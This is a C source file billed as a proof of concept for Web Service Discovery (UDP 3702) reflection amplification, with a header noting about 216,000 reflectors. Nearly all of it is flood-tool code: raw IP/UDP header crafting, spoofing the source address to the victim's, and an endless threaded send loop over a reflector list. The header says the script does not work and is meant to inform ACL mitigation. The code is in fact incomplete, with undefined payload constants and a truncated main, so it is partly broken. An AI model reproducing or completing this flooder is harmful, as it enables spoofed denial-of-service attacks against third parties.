/*-------------------------------
Web Service Discovery protocol amplification PoC made by Phenomite.
Yet another bloody UDP insecure service, this time similar to other abused SOAP protocols but needing no trigger payload.
Shodan showed 216,313 possible reflectors with the biggest number from Vietnam followed by United States.

Akamai has released their own report, please read the README.md.

I've scanned and filtered a list that will be alongside this script.

This script does not work!
It is simply here to understand how the packet is being constructed typically in order to mitigate its attributes with ACL.
-------------------------------*/

#define MAX_PACKET_SIZE 8192
#define PHI 0x9e3779b9
static uint32_t Q[4096], c = 362436;
static unsigned int DPORT = 3702;

void init_rand(uint32_t x)
{
	int i;
	Q[0] = x;
	Q[1] = x + PHI;
	Q[2] = x + PHI + PHI;
	for (i = 3; i < 4096; i++)
	{
		Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
	}
}

uint32_t rand_cmwc(void)
{
	uint64_t t, a = 18782LL;
	static uint32_t i = 4095;
	uint32_t x, r = 0xfffffffe;
	i = (i + 1) & 4095;
	t = a * Q[i] + c;
	c = (t >> 32);
	x = t + c;
	if (x < c)
	{
		x++;
		c++;
	}
	return (Q[i] = r - x);
}

/* function for header checksums */
unsigned short csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return (unsigned short)(~sum);
}

void setup_ip_header(struct iphdr *iph)
{
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOADSIZE;
	iph->id = htonl(rand() % 65500 + 1);
	iph->frag_off = 0;
	iph->ttl = MAXTTL;
	iph->protocol = IPPROTO_UDP;
	iph->check = 0;
	iph->saddr = inet_addr("127.0.0.1");
}
void setup_udp_header(struct udphdr *udph)
{
	udph->source = htons(rand() % 65500 + 1);
	udph->dest = htons(DPORT);
	udph->check = 0;
	memcpy((void *)udph + sizeof(struct udphdr), PAYLOAD, PAYLOADSIZE);
	udph->len = htons(sizeof(struct udphdr) + PAYLOADSIZE);
}
void *flood(void *par1)
{
	struct thread_data *td = (struct thread_data *)par1;
	char datagram[MAX_PACKET_SIZE];
	struct iphdr *iph = (struct iphdr *)datagram;
	struct udphdr *udph = (/*u_int8_t*/ void *)iph + sizeof(struct iphdr);
	struct sockaddr_in sin = td->sin;
	struct list *list_node = td->list_node;
	int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
	if (s < 0)
	{
		fprintf(stderr, "Could not open raw socket.\n");
		exit(-1);
	}
	init_rand(time(NULL));
	memset(datagram, 0, MAX_PACKET_SIZE);
	setup_ip_header(iph);
	setup_udp_header(udph);
	udph->source = htons(rand() % 13370 + 80);
	iph->saddr = sin.sin_addr.s_addr;
	iph->daddr = list_node->data.sin_addr.s_addr;
	iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
	int tmp = 1;
	const int *val = &tmp;
	if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(tmp)) < 0)
	{
		fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
		exit(-1);
	}
	init_rand(time(NULL));
	register unsigned int i;
	i = 0;
	while (1)
	{
		sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&list_node->data, sizeof(list_node->data));
		list_node = list_node->next;
		iph->daddr = list_node->data.sin_addr.s_addr;
		iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
		iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
		pps++;
		if (i >= limiter)
		{
			i = 0;
			usleep(sleeptime);
		}
		i++;
	}
}
int main(int argc, char *argv[])
{
	if (argc < 6)
	{
		fprintf(stdout, "%s hst prt ref thread lim time\n", argv[0]);
		exit(-1);
	}
	srand(time(NULL));
	int i = 0;
	head = NULL;
	int max_len = 128;
	char *buffer = (char *)malloc(max_len);
	buffer = memset(buffer, 0x00, max_len);
	int num_threads = atoi(argv[4]);
	int maxpps = atoi(argv[5]);
	limiter = 0;
	pps = 0;
	int multiplier = 20;
	FILE *list_fd = fopen(argv[3], "r");
	while (fgets(buffer, max_len, list_fd) != NULL)
	{
	}
}